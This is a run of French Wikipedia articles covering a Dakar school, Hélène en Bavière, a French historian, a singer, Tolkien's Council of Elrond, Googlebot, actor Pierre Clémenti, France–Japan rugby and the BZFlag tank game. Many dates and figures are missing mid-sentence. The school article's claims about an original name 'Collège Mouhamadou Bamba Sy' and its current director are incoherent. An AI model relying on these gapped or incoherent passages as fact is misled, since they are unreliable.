Établissement international d'éducation à la paix, il a été le premier établissement scolaire à recevoir le Prix UNESCO de l'éducation pour la paix en 1991.
Histoire.
D'abord dénommé Collège Mouhamadou Bamba Sy, l'établissement a été voulu et fondé en 1948 par Marcel Lefebvre, qui le confia aux pères maristes et en posa la le ; la eut lieu à la date normale, le , avec 125 élèves, dans un bâtiment unique isolé dans les dunes, relié par un chemin de terre de 1,5 km à la route menant à Dakar (8 km). Chaque père était professeur principal d'une classe, curé d'une paroisse de la Médina, et chauffeur de car pour aller à Dakar chercher les élèves, dont 2/3 de musulmans (contre 1/2 au lycée en ville).
Après les pères maristes, l'établissement fut dirigé par Jacques Maudru puis par Victor-Emmanuel Cabrita, décédé en 2007. Il est, depuis 2005, dirigé par Marie-Hélène Cuenot, 7 directeur depuis la fondation jusqu'en 2017. Le directeur actuel se prénomme André Sonko, ancien ministre du mandat Mouhamadou Bamba Sy.
Organisation.
Situé sur la commune d'arrondissement de Hann Bel-Air, dans l'Est de la capitale, c'est actuellement le plus important établissement scolaire de l'Afrique de l'Ouest. 
De la maternelle aux classes terminales, avec huit classes par niveau, réparties entre programme français et sénégalais, il reçoit chaque jour élèves de 63 nationalités différentes et d'une grande diversité sociale, culturelle et religieuse.
220 enseignants et 340 personnels administratifs et techniques animent cet établissement qui en font une des plus grosses entreprises du Sénégal.
En un an, de nouvelles classes (classes ivoire) furent mises en place pour accueillir les jeunes réfugiés et leur permettre de poursuivre leur scolarité.
Chaque année un thème fonde les objectifs du projet d'établissement et guide les actions éducatives, pédagogiques et culturelles initiées par le corps professoral et tous les acteurs de l'école. « Osons inventer l'avenir en agissant ensemble aujourd'hui», tel est le thème de l'année 2012-2013 de l'établissement qui se veut un établissement d'excellence.
L'IMES (Institut mariste d'Enseignement supérieur), institut supérieur de l'Université catholique de l'Afrique de l'Ouest ouvre ses portes au cours Sainte-Marie de Hann en octobre 2008 pour former des cadres en licence, masters et doctorats dans les filières : gestion des organisations, sciences de l'information et de la communication, sciences politiques et relations internationales et sciences de l'éducation. Depuis , de nouvelles classes préparatoires scientifiques en partenariat avec le réseau des écoles d'ingénieurs français, la FESIC, ont été ouvertes.

</doc>
<doc id="568644" url="https://fr.wikipedia.org/wiki?curid=568644" title="Sous-marins nucléaires lanceurs de missilles de croisière">
Sous-marins nucléaires lanceurs de missilles de croisière



</doc>
<doc id="568647" url="https://fr.wikipedia.org/wiki?curid=568647" title="Wanderer">
Wanderer



</doc>
<doc id="568648" url="https://fr.wikipedia.org/wiki?curid=568648" title="Hélène en Bavière">
Hélène en Bavière

Hélène Caroline Thérèse, duchesse en Bavière et princesse de Tour et Taxis, née le à Munich et morte le à Ratisbonne, est le troisième enfant et la première fille du duc Maximilien en Bavière et de la princesse Ludovica de Bavière. Elle était surnommée Néné.
Biographie.
Famille.
Pour des raisons dynastiques de réconciliation entre les deux branches de la Maison de Wittelsbach, son père, aîné de la branche cadette de la maison de Wittelsbach, a épousé à en 1828 la princesse Ludovica de Bavière, la plus jeune des sœurs du roi , qui en avait 19. Pour la jeune princesse qui d'altesse royale devient simplement altesse et dont les sœurs ont épousé des monarques, c'est une humiliante régression dans la hiérarchie nobiliaire, voire une sorte de mésalliance, d'autant plus que ce n'est que plus tard que son mari recevra de son beau-frère le fameux prédicat d'Altesse Royale. Par esprit de revanche, elle cherchera à marier ses filles le plus brillamment possible.
Hélène, aînée des filles du couple, a quatorze ans lorsque la révolution de 1848 embrase la Confédération germanique. Son oncle, le roi , doit abdiquer et céder le trône à son fils . Dans toute la Confédération, ses cousins princiers doivent fuir leurs États. En Autriche aussi, l'empereur Ferdinand abdique et laisse le trône à son neveu de , François-Joseph.
Une fiancée bafouée.
Or François-Joseph est un cousin utérin d'Hélène. Sa mère, l'archiduchesse Sophie, est une sœur de la duchesse Ludovica. Elle cherche à rétablir l'influence de l'Autriche en Allemagne en organisant un mariage des plus avantageux pour son fils. La Prusse s'étant récusée et la Saxe n'offrant aucune princesse susceptible de plaire au jeune empereur, c'est vers la Bavière, sa terre natale, que se tourne la très politique archiduchesse. La branche aînée ne pouvant proposer de princesses en âge d'être mariée, c'est vers la branche cadette que se tourne l'archiduchesse. Son choix se porte sur « Néné ». Les fiançailles impériales, qui sont un secret de polichinelle, doivent être annoncées publiquement lors du bal célébrant les du jeune monarque le . Cependant ce n'est pas vers Hélène, 19 ans, mais vers la sœur cadette de 15 ans de la princesse, la toute jeune Élisabeth, dite « Sissi », que se tourne le souverain.
Hélène est humiliée devant sa parentèle et les cours européennes. Elle a très peu d'espoir de trouver un prince voulant épouser une princesse ridiculisée en public devant la très prestigieuse cour d'Autriche. Quel souverain oserait rendre une visite officielle en Autriche ayant à son bras la fiancée délaissée de l'empereur ? Ce serait au moins un manque de tact, voire une faute diplomatique.
L'humiliation d'Hélène est aggravée par l'arrivée à Possenhofen d'une multitude de professeurs de toutes sortes dont la mission est de former la jeune Sissi à sa fonction d'impératrice et qui traitent la jeune fille avec les égards qui lui seront dus. Cependant, raisonnable et généreuse, Hélène ne témoigne d'aucune aigreur envers sa sœur.
Le mariage a lieu avec faste à Vienne le . Très vite, arrivent à Possenhofen des lettres où Sissi exprime ses difficultés d'adaptation à la cour de Vienne, ses révoltes face à l'étiquette et la nostalgie de sa famille et de sa Bavière natale.
Mariage.
Quelques années plus tard, un prétendant se présente, le prince Maximilien de Tour et Taxis. Celui-ci est l'héritier de la plus grosse fortune de Bavière mais n'appartient pas à une famille régnante. Aussi le roi Maximilien II refuse-t-il d'accorder sa permission à ce mariage inégal. Sissi, qui culpabilise, et François-Joseph, qui est gêné, prennent le parti d'Hélène et le à Possenhofen, la noce peut être célébrée.
Le couple aura quatre enfants :
Les années suivantes, dans le sillage de Sissi, leurs sœurs Marie-Sophie épouse le roi des Deux-Siciles et Mathilde le frère de celui-ci.
En 1860, bien que jeune mère de famille et enceinte pour la seconde fois, elle accompagne sa sœur Sissi, malade, à Madère.
L'année terrible.
1867 est une année terrible. L'année s'ouvrait pourtant joyeusement avec la proclamation des fiançailles de la benjamine "Sopherl" avec leur cousin et souverain, le roi Louis II de Bavière, ami intime du prince Paul de Taxis, beau-frère de Néné et la naissance de la princesse Marie-Thérèse de Bourbon-Siciles, premier enfant du comte et de la comtesse de Trani. Mais le , la jeune épouse de Gackel, Sophie de Saxe, meurt à l'âge de laissant une petite-fille de et un mari désespéré.
Le , la naissance du prince Albert, quatrième enfant et second fils des princes de Tours-et Taxis n'est qu'une joie éphémère car juin sera un mois de tragédie : le 6, leur cousine Mathilde de Teschen, fille de l'archiduc Albert et de la défunte duchesse Hildegarde de Bavière, dont on pensait faire une reine d'Italie, meurt brûlée vive à l'âge de . Le 8, sanctionnant le recul de l'Autriche et l'émergence de la Hongrie, François-Joseph et Sissi sont couronnés roi et reine de Hongrie. Le 19, l'empereur du Mexique, vaincu par les rebelles, est exécuté après un rapide procès tandis que son épouse, revenue en Europe où elle n'a trouvé aucun soutien à sa cause, sombre dans la folie. L'archiduchesse Sophie, vaincue sur le plan politique et profondément affectée dans son cœur de mère, se retire de la vie publique. Enfin, le 26, le prince-héritier Maximilien meurt à l'âge de après avoir confié l'éducation de ses enfants et la gestion de son immense fortune à la princesse Hélène anéantie.
En octobre, le roi Louis II rompt ses fiançailles avec Sophie-Charlotte. L'année suivante, Sophie-Charlotte épousera un prince français, le duc d'Alençon. En attendant, tous vont s'épancher à Possenhofen.
Veuvage.
Veuve à l'âge de , mère de quatre enfants dont l'aînée n'a que huit ans, la princesse Hélène assume la direction des nombreux biens de la famille de Tour et Taxis non sans souffrir de la perte qu’elle a subie. Après la fondation de l’Empire allemand en 1871, elle est confrontée à la politique du chancelier Bismarck qui souhaite nationaliser la poste bavaroise, propriété des Tour et Taxis.
En 1875, elle marie sa fille aînée, Louise, au prince Frédéric de Hohenzollern, membre catholique de la famille impériale allemande et frère du prince de Roumanie et de la comtesse de Flandres. Puis en 1877, sa fille Élisabeth épouse Michel de Portugal, duc de Bragance, prétendant au trône du Portugal ; mais la jeune femme meurt à peine âgée de , en 1881, laissant trois enfants en bas âge. Profondément affectée par ce nouveau deuil, la princesse Hélène se retire peu à peu de la vie publique.
En 1883, la princesse remet la gestion de son héritage à son fils aîné qui vient d'atteindre l'âge de . Le jeune homme succombe à la scarlatine deux ans plus tard. La douleur de la princesse Hélène est telle qu’elle est internée quelque temps en hôpital psychiatrique. Son second fils, Albert, étant âgé de , la princesse reprend pour trois ans, la gestion des biens de ses enfants.
Elle trouve réconfort et consolation dans sa foi profonde et sa piété active. Mais la confiance qu'elle accorde à son directeur spirituel fait jaser et des calomnies fusent. La princesse douairière est aussi connue pour son étourderie et son manque de ponctualité au point que, reçue en audience au Vatican, elle aurait fait attendre le pape.
En juin 1886, le roi , déclaré incapable de régner, est destitué et reclus dans un château. Une semaine plus tard, on retrouvera son corps et celui de son médecin dans le Lac de Starnberg. En 1888, la princesse perd son père, l'original duc Max. Le , son neveu, l'archiduc-héritier d'Autriche est retrouvé mort en compagnie de sa maîtresse, une jeune fille de , dans le pavillon de chasse de Mayerling. L'impératrice reprend sa manie des voyages loin de sa cour et de son pays tandis que la duchesse d'Alençon est internée un certain temps dans l'hôpital du docteur Kraft-Ebing.
Malgré les deuils et les scandales, la fin des années 1880 consacre la fortune de la famille. Le prince Albert se fiance à un membre de la famille impériale sans que cela crée la moindre opposition. La fiancée n'est autre que l'archiduchesse Marguerite-Clémentine d'Autriche, fille de l'archiduc Joseph, palatin de Hongrie et de la princesse Clotilde de Saxe-Cobourg-Gotha. L'archiduchesse Clotilde est la fille du prince Auguste de Saxe-Cobourg-Kohary, cousin germain catholique de la reine du Royaume-Uni et le plus important propriétaire terrien de Hongrie et de la princesse Clémentine d'Orléans, fille du roi des Français Louis-. La fiancée est une proche parente de la famille royale belge, la nièce du prince de Bulgarie et la cousine germaine de la reine-régente d'Espagne et de la future reine de Bavière. Par ce second mariage avec un membre d'une maison souveraine, les Tours et Taxis entrent de plain-pied dans le cercle restreint des familles royales.
Très malade après les fiançailles de son fils le prince Albert avec l'archiduchesse Marguerite-Clémentine d'Autriche, la princesse Hélène s'apprête à quitter le monde. Toute sa famille vient à son chevet, Sissi reste près d'elle jusqu'à sa mort et Hélène lui confie en anglais, langue dont les sœurs se servent pour communiquer entre elles sans craindre les oreilles indiscrètes : « Nous avons beaucoup souffert parce que nous avions un cœur. »
Dans l'art et la fiction.
La duchesse Hélène est surtout présente dans les films consacrés à sa sœur l'impératrice d'Autriche :

</doc>
<doc id="568653" url="https://fr.wikipedia.org/wiki?curid=568653" title="Sous-marin nucléaire lance-missiles aérodynamiques">
Sous-marin nucléaire lance-missiles aérodynamiques



</doc>
<doc id="568659" url="https://fr.wikipedia.org/wiki?curid=568659" title="Geneviève Dreyfus-Armand">
Geneviève Dreyfus-Armand

Geneviève Dreyfus-Armand est une historienne française, ancienne directrice de la bibliothèque de documentation internationale contemporaine (BDIC) et du musée d'histoire contemporaine.
Biographie.
Geneviève Dreyfus-Armand, docteur en histoire, conservateur général des bibliothèques, a travaillé sur l'histoire politique et sociale de la France contemporaine et sur les migrations espagnoles au . Elle est l'auteur de plusieurs ouvrages, de nombreux articles et a dirigé diverses publications. Elle a notamment publié "L'exil des républicains espagnols en France : de la Guerre civile à la mort de Franco" ("Albin Michel", 1999).
Conservateur en chef du secteur ibérique et latino-américain de la BDIC, puis responsable également de son département recherche et relations internationales (archives, formation à la recherche en histoire contemporaine), elle a dirigé la BDIC de 1998 à 2009.
Cofondatrice de l'Association des Amis de la BDIC et du Musée en 1981, elle a été secrétaire-adjointe de cette association (1981-1986), puis secrétaire de 1986 à 1989 et vice-présidente de 1989 à 1998. À ce titre, coordinatrice des publications de l'association ("Lettre de l'Association des Amis de la BDIC et du Musée" et, à partir de 1985, de "Matériaux pour l'histoire de notre temps").
Elle a fait partie du conseil scientifique de la Cité nationale de l'histoire de l'immigration de 2003 à 2007 ; elle en a démissionné le , avec plusieurs autres historiens, pour protester contre l'instauration du ministère de l'Immigration et de l'Identité nationale. Elle a fait partie du Conseil scientifique de la Maternité d'Elne de 2010 à 2014.
Membre des conseils scientifiques du MUME - Musée mémorial de l'exil de la Junquera -, du Mémorial du camp d'Argelès, du Mémorial de Rivesaltes et de la Maison des mémoires - la Mounière - de Septfonds. Membre du Comité d'histoire de l'Office français de protection des réfugiés et apatrides (OFPRA) depuis 2010.
Cofondatrice du CERMI (Centre d'études et de recherches sur les migrations ibériques) en 1996 ; présidente et directrice de publication de la revue "Exils et migrations ibériques au " de 2011 à 2018. Présidente d'honneur du CERMI depuis cette date.
Vice-présidente de l'association Présence de Manuel Azaña et présidente d'honneur de Caminar (Coordination nationale des descendants et amis des exilés de l'Espagne républicaine).

</doc>
<doc id="568664" url="https://fr.wikipedia.org/wiki?curid=568664" title="Jennifer Charles">
Jennifer Charles

Jennifer Charles (née le , à Washington D.C.) est une chanteuse et compositrice américaine connue pour son image sensuelle et ses interprétations sensibles de sa voix chaude et veloutée, comme pour ses chansons poétiques. Avec son ami Oren Bloedow, elle a fondé le groupe Elysian Fields.
Biographie.
La mère de Jennifer Charles était chanteuse dans les clubs de Washington, et son père était propriétaire d’une radio spécialisée dans le jazz. Elle étudie le théâtre, et joue dans des pièces d’avant-garde, tout en gardant une passion pour la musique.
Tout en étudiant (elle est diplômée de l’université de New York), elle pratique divers métiers : mannequin, serveuse, chanteuse de jazz.
Elle fonde le groupe Elysian Fields en 1995, avec lequel elle réalise quatre albums. Avec Oren Bloedow, ils participent à de nombreuses compilations, dont le premier titre d’un album de reprises de Serge Gainsbourg par John Zorn. On entend cette chanson, "Les Amours perdues", dans le film de Lea Pool "Emporte-moi" et dans celui de Philippe Grandrieux "Sombre".
Jennifer Charles travaille également sur d’autres projets. Elle enregistre avec Oren Bloedow "La Mar Enfortuna", un album de reprises de chansons ladinos parmi les plus accessibles du label Tzadik.
Jennifer Charles a aussi participé au projet Lovage de Dan the Automator, groupe pour lequel elle a coécrit la plus grande partie des titres, et pour lequel elle chante la plupart des chansons, accompagnée de Mike Patton (Faith No More, Tomahawk, Peeping Tom). Elle travaille avec Firewater, donnant une remarquable interprétation de "Get Off the Cross, We Need the Wood for the Fire", ainsi que sur différents enregistrements de John Zorn, dont le dernier, "Fœtus".
En France (où Elysian Fields a enregistré son troisième album), Jennifer Charles collabore avec Jean-Louis Murat sur l’album "A Bird on a Poire", sorti en 2004 : elle y chante toutes les chansons, seule ou en duo.Elle avait déjà eu l'occasion de collaborer avec l'artiste Auvergnat en 1999 sur l'album Mustango ou elle participe à plusieurs morceaux en tant que chanteuse
Elle interprète la chanson "Heart Stop" sur l'album "Dusty Rainbow From The Dark" de Wax Tailor, sorti en 2012. 
Enfin, Jennifer Charles a écrit divers poèmes et nouvelles depuis l’âge de neuf ans. Elle a étudié le chant classique indien avec son professeur Gulamji. Elle parle l’espagnol, aime voyager, jouer aux échecs, et pratique le yoga.

</doc>
<doc id="568665" url="https://fr.wikipedia.org/wiki?curid=568665" title="Maison des étudiants canadiens">
Maison des étudiants canadiens

La Maison des étudiants canadiens est l’une des 40 maisons qui constituent la Cité internationale universitaire de Paris dans le .
Fondée en 1926 grâce à un don de l'homme d'affaires montréalais Joseph-Marcellin Wilson, elle sera la deuxième maison à voir le jour à la CIUP et la première à ouvrir ses portes. Dans les années 1968-1969, deux ailes sont ajoutées à la « MEC » afin de pouvoir accueillir un plus grand nombre de résidents. Elle sera de nouveau rénovée et agrandie en 1984 et en 2005-2006.
La mission de la maison est d’accueillir des étudiants des cycles universitaires supérieurs et des chercheurs d’origine canadienne.

</doc>
<doc id="568667" url="https://fr.wikipedia.org/wiki?curid=568667" title="Conseil d'Elrond">
Conseil d'Elrond

Le Conseil d'Elrond est un événement fictif décrit dans le roman de l'écrivain britannique "Le Seigneur des anneaux" au livre II, chapitre 2.
Histoire.
Le Conseil d'Elrond se tient à Imladris (Fondcombe), chez Elrond Semi-Elfe (fils d'Eärendil), et réunit notamment le magicien Gandalf ; Glorfindel et Erestor de la Maison d'Elrond ; Galdor de Mithlond ; Legolas, fils du roi Thranduil des Elfes de la Forêt Noire ; Frodon et Bilbon Sacquet, Hobbits de la Comté ; les Hommes Boromir du Gondor et Aragorn des Dúnedain ; les nains d'Erebor Glóin et son fils Gimli.
Ce Conseil a pour objet le sort de l'Anneau unique forgé par Sauron, tombé accidentellement entre les mains du hobbit Bilbon, qui l'a transmis à son neveu Frodon. L'Anneau est l'arme suprême du Seigneur des Ténèbres, sa substance même, et doit absolument être détruit. Mais il engendre une telle fascination, un tel pouvoir d'attrait maléfique, qu'il est difficile pour quiconque le détient de s'en séparer, "a fortiori" pour le détruire.
Au cours du conseil est raconté comment Gwaihir, le Seigneur des Vents a trouvé Gandalf sur la cime d'Orthanc, emprisonné par Saroumane.
Après maints débats très animés, les participants au conseil décident de fonder la Communauté de l'anneau, composée de neuf marcheurs (les hommes Aragorn et Boromir, les hobbits Frodon, Sam, Pippin et Merry, l'elfe Legolas ainsi que le nain Gimli, guidés par Gandalf) et chargée de porter l'anneau en Mordor, le royaume ténébreux de Sauron, pour le jeter dans les flammes de la Montagne du Destin d'où il est né des milliers d'années plus tôt. Le nombre de neuf membres est choisi pour contrer les neuf Nazgûl, serviteurs de Sauron. Chacun des peuples représenté lors du conseil compte ainsi au moins un représentant parmi la Communauté, un magicien, un elfe, un nain, deux hommes et quatre hobbits.
Le sort des membres de cette communauté occupe la part essentielle dans la suite du "Seigneur des Anneaux".
Conception et évolution.
Le Conseil d'Elrond se place dans la continuité du Conseil Blanc qui se réunissait autrefois pour contrer la menace grandissante de Sauron à Dol Guldur et était composé de magiciens et d'elfes.
Adaptations.
Dans l' de Peter Jackson, on voit d'autres humains, et d'autres Elfes de Mirkwood (dont Figwit) accompagnant Legolas, qui n'est pas seul comme dans l'œuvre originale.
Dans la culture populaire.
Dans le roman "Seul sur Mars", des employés de la NASA constituent un groupe nommé Projet Elrond en référence au Conseil d'Elrond.

</doc>
<doc id="568669" url="https://fr.wikipedia.org/wiki?curid=568669" title="Googlebot">
Googlebot

Les googlebots sont des robots d'indexation utilisés par le moteur de recherche Google afin de recenser et indexer les pages web.
Depuis 2019, Google offre une version "evergreen" de Google Bot basé sur Chromium. Google Bot va donc être mis à jour beaucoup plus régulièrement. La nouvelle version de Google Bot apporte plus d'un millier de nouvelles fonctionnalités. 
Version desktop.
La chaîne de caractères permettant de les identifier en tant qu"'user agent" est, selon la tâche qu'ils effectuent, l'une des trois suivantes :
Version mobile.
Il existe trois versions du user-agent de Googlebot en version mobile : 
Google utilise un autre type de robot, dénommé Mediabot, qui analyse le contenu des pages intégrant un encart AdSense afin de fournir une publicité pertinente par rapport au contexte.
Maîtrise du crawl.
Dans Google Outils pour les webmasters, la fonction "Analyser comme Googlebot" permet de voir une page du site telle qu'elle est indexée par le Googlebot.

</doc>
<doc id="568675" url="https://fr.wikipedia.org/wiki?curid=568675" title="ARMS">
ARMS



</doc>
<doc id="568682" url="https://fr.wikipedia.org/wiki?curid=568682" title="Janus Thickey">
Janus Thickey



</doc>
<doc id="568683" url="https://fr.wikipedia.org/wiki?curid=568683" title="Pierre Clémenti (acteur)">
Pierre Clémenti (acteur)

Pierre Clémenti est un acteur et réalisateur français né le dans le où il est mort le . Acteur marquant du cinéma d'auteur des années 1960 et 1970, il joue dans des films majeurs comme "Le Guépard" de Luchino Visconti, "Belle de jour" de Luis Buñuel et "Le Conformiste" de Bernardo Bertolucci. À partir de 1967, il commence en parallèle une carrière de réalisateur de films courts à caractère expérimental. Il a également travaillé comme acteur au théâtre, notamment dans la troupe Marc'O.
Biographie.
Pierre Clémenti perd son père au cours de la guerre de 1939-1945. Celui-ci ne l'a pas reconnu et Pierre portera donc le patronyme de sa mère, d'origine corse. Elle l'élève seule avec son demi-frère aîné de deux ans, Maurice. Ils vivent dans un petit appartement de la rue Saint-Placide. D'abord concierge, elle confectionne ensuite des chapeaux pour une maison de mode de la place Vendôme. Comme elle rentre tard, elle part souvent chercher ses fils qui traînent dans les rues de Saint-Germain-des-Prés.
Alors qu'il a douze ans, elle décide de mettre Pierre et son demi-frère aîné en pension à l'école Théophile-Roussel à Montesson. Il en ressort deux ans après avec le certificat d'études primaires. Il devient télégraphiste, mais est remercié au bout de six mois par l'administration des Postes et Télécommunications au motif qu'il a les cheveux trop longs.
Il devient alors chasseur à l'Hôtel Américain, rue Littré à Paris, dont il est également renvoyé à cause de ses cheveux jugés trop longs. De son côté, sa mère abandonne son métier dans la confection pour devenir caissière à la Cité universitaire, rue Férou.
Davantage intéressé par le théâtre et le cinéma que par ses emplois alimentaires, Pierre Clémenti suit alors les cours du Théâtre d'art dramatique de Charles Dullin au Théâtre du Vieux-Colombier et le conservatoire de la rue Blanche.
Il travaille ensuite avec plusieurs réalisateurs français, notamment Michel Deville, Philippe Garrel ou Jacques Rivette, et étrangers : Luchino Visconti, Luis Buñuel, Bernardo Bertolucci, Pier Paolo Pasolini, Glauber Rocha...
Il est marié avec l'actrice Margareth Le Van (née en 1948) dont il a un enfant, Balthazar, né en ; Marie-Laure de Noailles en est la marraine et le manadier Jean Lafont son parrain.
Divorcé, Pierre Clémenti se remarie plus tard avec Nadine Hermand avec qui il a un second fils, nommé Valentin.
Il meurt le , à l'âge de 57 ans, des suites d'un cancer du foie. Sa tombe se trouve au cimetière du village de Soucy, dans l'Yonne.
Une rétrospective a lieu en 2019 lors du festival "Toute la mémoire du monde" à Paris, au Reflet Médicis et à la Cinémathèque française, vingt ans après sa disparition.
Faits divers.
En , soupçonné de détention et de consommation de drogue, il est arrêté à Rome. Il passe 17 mois en prison avant d'être relâché pour insuffisance de preuves. Après sa libération, il publie un livre, en 1973, "Quelques messages personnels," réquisitoire contre la justice et les conditions d'emprisonnement, mais aussi témoignage qui retrace les épisodes essentiels de son expérience artistique. Il est également l'auteur d'une pièce de théâtre, "Chronique d'une mort retardée", de poèmes et d'un oratorio, "Le Deuxième Monde".

</doc>
<doc id="568686" url="https://fr.wikipedia.org/wiki?curid=568686" title="France-Japon en rugby à XV">
France-Japon en rugby à XV

Cet article retrace les confrontations entre l'équipe de France de rugby à XV et l'équipe du Japon de rugby à XV. Les deux équipes se sont affrontées à huit reprises dont deux en Coupe du monde. Les Français n'ont perdu aucune rencontre.
Historique.
Le premier France-Japon se déroule le samedi à Bordeaux. Les Japonais, qui disputent le onzième et dernier match de leur tournée européenne, s'inclinent 30-18. 
Il faut attendre 2003, à l'occasion de la Coupe du monde en Australie, pour revoir les deux équipes se rencontrer. Le XV de France s'impose largement sur le score de 51 à 29.
Huit ans plus tard, lors du Mondial 2011 en Nouvelle-Zélande, le XV de France croise à nouveau la route du Japon pour une nouvelle victoire (47-21). Une victoire longue à se dessiner pour les Français qui ne menaient que de quatre points avant l'heure de jeu.
En novembre 2017, à Nanterre, la France reçoit le Japon pour la première fois depuis 1973. Alors en crise après des défaites contre la Nouvelle-Zélande (18-38) puis l'Afrique du Sud (17-18), le XV de France est tenu en échec à domicile (23-23) et est sifflé par son propre public.
En juillet 2022, la France effectue sa tournée d'été au Japon, une première dans l'histoire des Bleus. Lors de la première rencontre, le XV de France s'impose sur le score de 42 à 23 après avoir été tenu en échec à la pause (13-13). Le deuxième match voit la France l'emporter d'une courte tête (20-15). 
Le 9 novembre 2024, à Saint-Denis, la France bat le Japon 52-12 et signe sa plus large victoire face à cet adversaire.
Confrontations.
Confrontations non-officielles.
Durant l'histoire des confrontations entre les deux nations, certaines ne créditent aucune cape internationale aux joueurs français les disputant, l'opposition n'ayant pas le statut officiel de test match du point de vue de la Fédération française de rugby.

</doc>
<doc id="568687" url="https://fr.wikipedia.org/wiki?curid=568687" title="BZFlag">
BZFlag

BZFlag (abréviation de Battle Zone capture the Flag) est un jeu vidéo multijoueur et libre de chars en 3D (OpenGL) du genre FPS.
Il est développé par une soixantaine de volontaires dont principalement Tim Riker. Il a été écrit originellement pour Irix, mais fonctionne maintenant sous Windows, Linux, Mac OS X, BSD, Solaris et d'autres plateformes. Il est distribué sous la licence GNU LGPL, une licence un peu différente de la GNU GPL sous laquelle il a longtemps été distribué. C'est donc un logiciel libre.
BZFlag est très populaire, avec des parties en ligne toujours en cours. Il y a une moyenne de 250 serveurs actifs à tout moment, ainsi que plus de 4500 joueurs enregistrés sur le forum officiel. En , BZFlag est sélectionné comme « projet du mois « par la plate-forme SourceForge.net.
Vue d'ensemble.
Lors d'une partie de BZFlag, chaque joueur conduit un char vu à la première personne, dans un monde (appelé une “carte”). Le but du jeu est de détruire les chars adverses. Les chars peuvent sauter, tirer et bouger dans toutes les directions. Ils peuvent également ramasser des drapeaux (voir plus bas).
Le joueur dispose d'une vue à la première personne (voir devant le char), d'un radar et d'une console permettant de discuter entre joueurs.
Chaque char appartient à une équipe, et chaque équipe se distingue par sa couleur: rouge, vert, bleu, mauve et enfin jaune pour les chars de l'équipe filou. L'équipe filou est utilisé pour les combats sans équipe, c'est-à-dire que ses membres peuvent se tuer entre eux. Et pour finir, une équipe d'observateurs qui restent à part (couleur blanche).
Il y a trois types de jeu différents. Les types sont spécifiques aux cartes. 
Histoire du développement.
Initialement, BZFlag était un projet écrit en C par Chris Schoneman en 1992. Il reprenait un jeu très populaire et innovant: Battlezone. Son nom de baptême était “bz”, et malgré les ressemblances avec le jeu du même nom de Chris Fouts, les deux jeux étaient complètement indépendants l'un de l'autre.
Au début, BZFlag était simplement un Shoot them up sans autre spécificité. C'est après que Schoneman et ses amis (qui l'ont aidé à développer BZFlag depuis le début) ne commencent à s'ennuyer de ce concept, qu'ils inventèrent le mode de capture du drapeau. Celui-ci demandait plus de stratégie et d'habileté et donc redonna de l'intérêt au jeu.
C'est en 1993 que BZFlag a été rendu public pour la première fois. Cela fut un tournant dans l'histoire de ce jeu, car un tricheur édita le code source de son client afin de se donner des nouveaux pouvoirs que la version officielle ne permettait pas. Cela a inspiré Schoneman et ses amis. Ils ont rajouté des supers drapeaux qui modifiaient les performances du char. Les quatre premiers drapeaux étaient la Vélocité, la Rotation rapide, le Tir accéléré et l'Accélérateur d'Oscillations qui permet aux chars de traverser les objets. Il n'y avait alors qu'un seul drapeau de chaque type sur la carte, et tous les drapeaux portaient une marque distinctive pour qu'on puisse les reconnaître. Les mauvais et d'autres bons drapeaux ont ensuite été rajoutés, et les marques distinctives ont été supprimées. Cette idée des drapeaux reste aujourd'hui une part principale du jeu.
En 1997, la version 1.7d apporta une nouvelle fonctionnalité révolutionnaire : une liste des serveurs publics intégrée au jeu. Car jusque-là, les joueurs devaient soit utiliser leurs propres serveurs, soit connaître l'adresse d'autres serveurs, soit lire une liste publiée et maintenue par des tiers. Mais dorénavant cette nouvelle liste (hébergée sur le site officiel de BZFlag) permettait à n'importe qui de jouer sur les serveurs qui décidaient de devenir publics. Beaucoup disent que sans cette fonctionnalité BZFlag ne serait jamais devenu aussi populaire qu'aujourd'hui.
Finalement Schoneman a réécrit BZFlag en C++ pour la troisième compétition IndiZone des SGI, et gagna dans la catégorie des Moteurs 3D. Ensuite le projet fut donné à Tim Riker qui actuellement le maintient et le fait évoluer depuis la version 1.7e.
Les divisions.
Il existe beaucoup de divisions dans BZFlag. Les divisions sont lancées et gérées par un ou plusieurs administrateurs qui sont eux-mêmes des joueurs. Les matchs de division durent 30 minutes et ne sont que d'un seul type de partie - avec une exception. Par exemple, la première division fut la division Ducati. Dans cette division, les joueurs s'affrontaient sur des cartes générées aléatoirement, rouges contre verts, avec deux munitions, des ricochets mais pas de saut. Ceci avait pour but tester les véritables compétences des joueurs. Voici une autre division du même genre : la division Pillbox. Cette division diffère de la Ducati dans quelques règles : pas de ricochet et trois munitions au lieu de deux, de plus la carte est fixe.
L'exception est la récente division Open où les équipes choisissent une carte pour chaque match et la durée de la partie.
Les cartes.
Un serveur BZFlag peut utiliser une carte créée au hasard par le système, ou une carte personnalisée créée par l'utilisateur en utilisant un langage proche du langage de script. Bien que l'écriture des cartes soit assez simple dans ce langage, la plupart des utilisateurs se servent de l'éditeur officiel, BZEdit, qui permet d'automatiser le processus. BZEdit est distribué avec le jeu et est disponible sur le site BZFlag de SourceForge.net.
Pour simplifier, il existe trois objets basiques :
Les deux premiers sont configurables. Les téléporteurs sont rectangulaires et bordés de jaune. Tous les téléporteurs ne téléportent pas : suivant le bon vouloir du cartographe.
Avant la version 2.0, les cartes étaient basiques et n'incluaient que ces trois objets. La version 2.0 a introduit bon nombre de nouveaux éléments complexes par exemple l'eau. Un petit programme a été créé pour BZFlag afin de convertir les fichiers 3D Studio Max en cartes BZFlag.
La syntaxe pour la description de chaque élément commence par le nom de l'élément, puis suivent ses spécifications, et elle termine par le mot "end". L'exemple suivant place un cube de dimension unités (un char mesure environ une unité) aux coordonnées 50x 50y, il n'est pas tourné vers le Nord :
 box #start (name the element)
 position -50 -50 0 #the position
 size 10 10 10 #the size of it, in units (x, y, z)
 rotation 0 #degrees of rotation
 end #all elements end with this keyword
Voici la liste des objets :
Les commentaires commencent par "#". Les multiples espaces sont ignorées.
Les drapeaux.
